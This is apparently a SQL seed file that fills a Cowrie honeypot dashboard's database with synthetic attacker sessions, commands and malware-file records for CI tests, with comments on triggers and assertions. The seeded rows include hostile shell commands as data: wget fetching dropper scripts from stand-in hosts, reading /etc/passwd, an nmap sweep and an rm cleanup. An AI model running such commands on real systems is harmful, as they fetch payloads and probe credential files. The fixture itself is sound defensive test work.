-- Synthetic honeypot traffic for CI.
--
-- Why this exists: CI used to smoke-test every endpoint against an *empty*
-- database and assert only the status code. When migration 006 aborted in
-- production and left cowrie_asn_agg empty, /top-asn happily returned 200 with
-- `{"rows":[],"total":0}` — indistinguishable, to that check, from a healthy
-- deploy. Seeding real rows lets CI assert that endpoints return *data*.
--
-- These INSERTs also fire trg_sync_cowrie_event_aggs and
-- trg_sync_cowrie_files_agg, which is the only test coverage the aggregate
-- triggers have anywhere. The counts asserted in ci.yml are derived from the
-- rows below, so if you edit this file, update those expectations too.
--
-- Two deliberate choices:
--
--   * Timestamps are relative to now(). /summary, /sessions and
--     /events-per-hour all filter to the last 24 hours, so a fixture with
--     hardcoded dates would quietly decay to zero rows a day after it was
--     written and the assertions would start passing vacuously.
--
--   * Geo columns are set explicitly rather than left to the API's GeoIP
--     enrichment: the MaxMind databases are not available on a CI runner, so
--     ingesting through the API would produce NULL asn/country and leave the
--     leaderboard aggregates empty — the very thing we are trying to test.

BEGIN;

-- 19 events, 5 distinct source IPs, 4 ASNs, 4 countries, 4 sessions.
-- s004 sits on its own ASN/country so it cannot disturb the leaderboard
-- assertions, which exist to check ordering rather than these totals.
INSERT INTO cowrie_events
  ("timestamp", src_ip, dest_port, username, password, command, session_id, country_iso, asn, org, city)
VALUES
  -- Session s001 — 1.2.3.4 (CN, AS4134): login, recon, dropper, cleanup.
  (now() - interval '60 min', '1.2.3.4', 22, 'root',  '123456', NULL,                          's001', 'CN', 4134,  'Chinanet',         'Beijing'),
  (now() - interval '59 min', '1.2.3.4', 22, NULL,    NULL,     'uname -a',                    's001', 'CN', 4134,  'Chinanet',         'Beijing'),
  (now() - interval '58 min', '1.2.3.4', 22, NULL,    NULL,     'cat /proc/cpuinfo',           's001', 'CN', 4134,  'Chinanet',         'Beijing'),
  (now() - interval '57 min', '1.2.3.4', 22, NULL,    NULL,     'wget http://1.2.3.4/bins.sh', 's001', 'CN', 4134,  'Chinanet',         'Beijing'),
  (now() - interval '56 min', '1.2.3.4', 22, NULL,    NULL,     'rm -rf /tmp/bins.sh',         's001', 'CN', 4134,  'Chinanet',         'Beijing'),

  -- Session s002 — 5.6.7.8, same ASN as above so unique_ips != total.
  (now() - interval '45 min', '5.6.7.8', 22, 'admin', 'admin',  NULL,                          's002', 'CN', 4134,  'Chinanet',         'Shanghai'),
  (now() - interval '44 min', '5.6.7.8', 22, 'root',  '123456', NULL,                          's002', 'CN', 4134,  'Chinanet',         'Shanghai'),
  (now() - interval '43 min', '5.6.7.8', 22, NULL,    NULL,     'busybox wget http://x/y.sh',  's002', 'CN', 4134,  'Chinanet',         'Shanghai'),

  -- Session s003 — 9.9.9.9 (US, AS15169) on telnet.
  (now() - interval '30 min', '9.9.9.9', 23, 'root',  'toor',   NULL,                          's003', 'US', 15169, 'Google LLC',       'Mountain View'),
  (now() - interval '29 min', '9.9.9.9', 23, NULL,    NULL,     'nmap -sS 10.0.0.0/8',         's003', 'US', 15169, 'Google LLC',       'Mountain View'),

  -- Sessionless events — the schema allows NULL session_id, so /sessions must
  -- not choke on them and /latest must still list them.
  (now() - interval '15 min', '10.20.30.40', 22, 'user', 'pass', NULL,                         NULL,   'DE', 3320,  'Deutsche Telekom', 'Berlin'),
  (now() - interval '14 min', '10.20.30.40', 22, NULL,   NULL,   'echo hello',                 NULL,   'DE', 3320,  'Deutsche Telekom', 'Berlin'),

  -- Session s004 — six command rows, but all the SAME command. Some older
  -- sessions were ingested more than once, so this shape exists in production
  -- (one 2026-08-09 session holds twelve exact copies of every event).
  -- /sessions/featured must rank by DISTINCT commands: by raw count s004 (6)
  -- beats s001 (4) and the front page would replay one line six times over.
  (now() - interval '20 min', '203.0.113.9', 22, 'admin','123456', NULL,            's004', 'BR', 64512, 'Example Telecom', 'Sao Paulo'),
  (now() - interval '19 min', '203.0.113.9', 22, NULL,   NULL,    'cat /etc/passwd', 's004', 'BR', 64512, 'Example Telecom', 'Sao Paulo'),
  (now() - interval '19 min', '203.0.113.9', 22, NULL,   NULL,    'cat /etc/passwd', 's004', 'BR', 64512, 'Example Telecom', 'Sao Paulo'),
  (now() - interval '19 min', '203.0.113.9', 22, NULL,   NULL,    'cat /etc/passwd', 's004', 'BR', 64512, 'Example Telecom', 'Sao Paulo'),
  (now() - interval '19 min', '203.0.113.9', 22, NULL,   NULL,    'cat /etc/passwd', 's004', 'BR', 64512, 'Example Telecom', 'Sao Paulo'),
  (now() - interval '19 min', '203.0.113.9', 22, NULL,   NULL,    'cat /etc/passwd', 's004', 'BR', 64512, 'Example Telecom', 'Sao Paulo'),
  (now() - interval '19 min', '203.0.113.9', 22, NULL,   NULL,    'cat /etc/passwd', 's004', 'BR', 64512, 'Example Telecom', 'Sao Paulo');

-- cowrie_unique_commands is maintained by the ingest endpoint, not by a
-- trigger, so it has to be seeded alongside. Mirrors the commands above.
-- total_events/unique_ips are invented; only their ordering is asserted.
INSERT INTO cowrie_unique_commands (command, first_seen, last_seen, total_events, unique_ips)
VALUES
  ('uname -a',                    now() - interval '59 min', now() - interval '59 min', 1, 1),
  ('cat /proc/cpuinfo',           now() - interval '58 min', now() - interval '58 min', 1, 1),
  ('wget http://1.2.3.4/bins.sh', now() - interval '57 min', now() - interval '57 min', 5, 2),
  ('rm -rf /tmp/bins.sh',         now() - interval '56 min', now() - interval '56 min', 3, 1),
  ('busybox wget http://x/y.sh',  now() - interval '43 min', now() - interval '43 min', 2, 1),
  ('nmap -sS 10.0.0.0/8',         now() - interval '29 min', now() - interval '29 min', 1, 1),
  ('echo hello',                  now() - interval '14 min', now() - interval '14 min', 1, 1),
  ('cat /etc/passwd',             now() - interval '19 min', now() - interval '19 min', 6, 1)
ON CONFLICT (command) DO NOTHING;

-- Malware samples. Fires trg_sync_cowrie_files_agg -> cowrie_files_agg, and
-- covers migration 005: first_seen must fall back to timestamp when mtime is
-- NULL, which is why the second row deliberately has no mtime.
INSERT INTO cowrie_files ("timestamp", sha256, size_bytes, mtime, full_path, vt_type, vt_malicious)
VALUES
  (now() - interval '57 min', 'aaaa1111bbbb2222cccc3333dddd4444eeee5555ffff6666aaaa7777bbbb8888', 4096, now() - interval '58 min', '/tmp/bins.sh', 'ELF', 42),
  (now() - interval '43 min', '1111aaaa2222bbbb3333cccc4444dddd5555eeee6666ffff7777aaaa8888bbbb',  512, NULL,                       '/tmp/y.sh',    'Text', 3);

COMMIT;
